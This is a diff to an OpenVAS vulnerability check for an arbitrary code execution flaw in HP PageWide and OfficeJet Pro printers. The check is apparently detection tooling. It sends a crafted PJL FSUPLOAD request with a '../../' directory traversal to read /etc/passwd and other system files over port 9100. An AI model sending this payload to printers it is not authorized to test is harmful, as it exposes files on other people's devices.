@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_hp_printer_rce_vuln.nasl 10629 2018-07-25 18:06:02Z cfischer $
+# $Id: gb_hp_printer_rce_vuln.nasl 11747 2018-10-04 09:58:33Z jschulte $
 #
 # HP Printers Arbitrary Code Execution Vulnerability
 #
@@ -28,8 +28,8 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.106920");
-  script_version("$Revision: 10629 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-07-25 20:06:02 +0200 (Wed, 25 Jul 2018) $");
+  script_version("$Revision: 11747 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-04 11:58:33 +0200 (Thu, 04 Oct 2018) $");
   script_tag(name:"creation_date", value:"2017-07-05 09:03:32 +0700 (Wed, 05 Jul 2017)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -46,20 +46,21 @@ if (description)
 
   script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
   script_family("Remote file access");
-  script_dependencies("pjl_detect.nasl");
+  script_dependencies("pjl_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/hp-pjl", 9100);
+  script_require_keys("Host/runs_unixoide");
   # nb: Don't add an script_mandatory_keys from e.g. pjl_detect.nasl
   # as some HP printers doesn't answer to the PJL probe request.
 
   script_tag(name:"summary", value:"A potential security vulnerability has been identified with certain HP
-printers. This vulnerability could potentially be exploited to execute arbitrary code.");
+  printers. This vulnerability could potentially be exploited to execute arbitrary code.");
 
   script_tag(name:"vuldetect", value:"Sends a crafted PJL request and checks the response.");
 
   script_tag(name:"affected", value:"HP PageWide Printers and HP OfficeJet Pro Printers.");
 
   script_tag(name:"solution", value:"HP has provided firmware updates for impacted printers. See the
-referenced advisory for further details.");
+  referenced advisory for further details.");
 
   script_xref(name:"URL", value:"https://support.hp.com/lt-en/document/c05462914");
 
@@ -77,20 +78,27 @@ if (!port) {
 if (!get_port_state(port))
   exit(0);
 
+files = traversal_files("linux");
+
 # PJL ports get the Hex banner set to "aeaeaeaeae" in register_all_pjl_ports()
 if (hexstr(get_unknown_banner(port: port, dontfetch: TRUE)) == "aeaeaeaeae" || not_in_kb) {
   soc = open_sock_tcp(port);
   if (!soc)
     exit(0);
 
-  send(socket: soc, data: '\x1b%-12345X@PJL FSUPLOAD NAME="../../etc/passwd" OFFSET=0 SIZE=648\r\n\x1b%-12345X\r\n');
-  res = recv(socket: soc, length: 1024);
-  close(soc);
+  foreach pattern(keys(files)) {
 
-  if (res =~ "root:.*:0:[01]:") {
-    report = "It was possible to obtain the /etc/passwd file.\n\n" + res;
-    security_message(port: port, data: report);
-    exit(0);
+    file = files[pattern];
+
+    send(socket: soc, data: '\x1b%-12345X@PJL FSUPLOAD NAME="../../' + file + '" OFFSET=0 SIZE=648\r\n\x1b%-12345X\r\n');
+    res = recv(socket: soc, length: 1024);
+    close(soc);
+
+    if (egrep(string: res, pattern: pattern)) {
+      report = "It was possible to obtain the /" + file + " file.\n\n" + res;
+      security_message(port: port, data: report);
+      exit(0);
+    }
   }
 }
 
